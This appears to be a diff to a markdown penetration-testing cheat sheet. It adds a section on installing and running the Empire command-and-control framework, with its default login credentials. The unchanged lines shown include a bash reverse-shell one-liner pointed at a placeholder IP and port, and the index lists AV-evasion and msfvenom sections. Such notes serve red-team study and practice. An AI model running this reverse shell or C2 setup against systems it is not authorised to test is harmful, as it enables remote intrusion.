@@ -482,9 +482,11 @@ set CMD <command>
 - [ARP Poisoning](#ARP-Poisoning)
 - [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
 - [Bind and Reverse Shells](#Bind-and-Reverse-Shells)
+- [Empire](#Empire)
 - [MSF Payloads and Listeners](#MSF-Payloads-and-Listeners)
   - [msfvenom](#msfvenom)
 - [Linux Compilation](#Linux-Compilation)
+- 
 - [Windows Cross-Compilation](#Windows-Cross-Compilation)
 
 ```
@@ -739,6 +741,22 @@ bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ### Useful Links
 - https://github.com/swisskyrepo/PayloadsAllTheThings
 - https://www.revshells.com/
+
+## Empire
+[<< Index](#Index)
+```
+sudo apt-get update && sudo apt-get install powershell-empire starkiller -y
+
+sudo powershell-empire server
+
+sudo powershell-empire client
+listeners
+agents
+
+https://localhost:1337
+empireadmin / password123
+```
+- https://www.kali.org/blog/empire-starkiller/ (Web GUI)
 
 ## MSF Payloads and Listeners
 [<< Index](#Index)
